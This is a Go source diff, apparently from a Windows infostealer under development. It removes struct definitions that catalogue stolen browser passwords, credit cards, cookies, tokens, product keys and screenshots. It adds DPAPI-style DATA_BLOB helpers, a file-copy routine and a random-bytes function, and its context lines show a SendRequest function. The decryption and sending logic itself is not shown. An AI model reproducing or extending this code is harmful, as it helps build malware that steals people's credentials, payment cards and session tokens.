@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"os"
@@ -13,6 +14,7 @@ import (
 	"regexp"
 	"strings"
 	"time"
+	"unsafe"
 
 	_ "github.com/mattn/go-sqlite3"
 )
@@ -35,74 +37,14 @@ var (
 	TEMPFILEDIR string = TEMP + "\\" + RandStringBytes(16)
 )
 
-type geninf struct {
-	Ip         string  `json:"ip"`
-	Username   string  `json:"username"`
-	BSSID      string  `json:"bssid"`
-	Info       SysInfo `json:"info"`
-	Screenshot string  `json:"screenshot"` // This should be an actual Base64 encoding of the file
-}
-
-type dumps struct {
-	Passwords   []PASSWD   `json:"passwords"`
-	CreditCards []CCARD    `json:"credit-cards"`
-	Cookies     []COOKIE   `json:"cookies"`
-	ProductKey  PRODUCT_ID `json:"product-key"`
-	Tokens      []string   `json:"tokens"`
-}
-
 type DATA_BLOB struct {
 	cbData uint32
 	pbData *byte
 }
 
-type PLATFORM struct {
-	Chromium   bool
-	LocalState string
-	DataFiles  string
-}
-
-type PASSWD struct {
-	Url  string `json:"url"`
-	User string `json:"username"`
-	Pass string `json:"password"`
-}
-
-type CCARD struct {
-	Name       string `json:"name"`
-	Number     string `json:"number"`
-	Expiration string `json:"exp"`
-}
-
-type COOKIE struct {
-	Host  string `json:"url"`
-	Name  string `json:"name"`
-	Value string `json:"value"`
-}
-
-type PRODUCT_ID struct {
-	Value string `json:"value"`
-	Type  string `json:"type"`
-}
-
-type OUTPUT struct {
-	GeneralInfo geninf `json:"general-info"`
-	Dumps       dumps  `json:"dumps"`
-}
-
-type SysInfo struct {
-	Hostname string
-	Platform string
-	CPU      string
-	RAM      uint64
-	Disk     uint64
-}
-
 func CleanUp() {
 	_ = os.RemoveAll(TEMPFILEDIR)
 }
-
-func main() {}
 
 func FileExists(filePath string) bool {
 	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
@@ -111,6 +53,62 @@ func FileExists(filePath string) bool {
 	} else {
 		return true
 	}
+}
+
+func NewBlob(d []byte) *DATA_BLOB {
+	if len(d) == 0 {
+		return &DATA_BLOB{}
+	}
+	return &DATA_BLOB{
+		pbData: &d[0],
+		cbData: uint32(len(d)),
+	}
+}
+
+func (b *DATA_BLOB) ToByteArray() []byte {
+	d := make([]byte, b.cbData)
+	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
+	return d
+}
+
+func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
+	sourceFile, err := os.Open(pathSourceFile)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+
+	destFile, err := os.Create(pathDestFile)
+	if err != nil {
+		return err
+	}
+	defer destFile.Close()
+
+	_, err = io.Copy(destFile, sourceFile)
+	if err != nil {
+		return err
+	}
+
+	err = destFile.Sync()
+	if err != nil {
+		return err
+	}
+
+	sourceFileInfo, err := sourceFile.Stat()
+	if err != nil {
+		return err
+	}
+
+	destFileInfo, err := destFile.Stat()
+	if err != nil {
+		return err
+	}
+
+	if sourceFileInfo.Size() == destFileInfo.Size() {
+	} else {
+		return err
+	}
+	return nil
 }
 
 func SendRequest(body string) {
@@ -207,6 +205,16 @@ func RandIntBytes(n int) string {
 		b[i] = numberBytes[rand.Intn(len(numberBytes))]
 	}
 	return string(b)
+}
+
+func RandRawBytes(n int) []byte {
+	rand.Seed(time.Now().UnixNano())
+
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = byte(rand.Intn(255))
+	}
+	return b
 }
 
 func GenerateHeaders() {
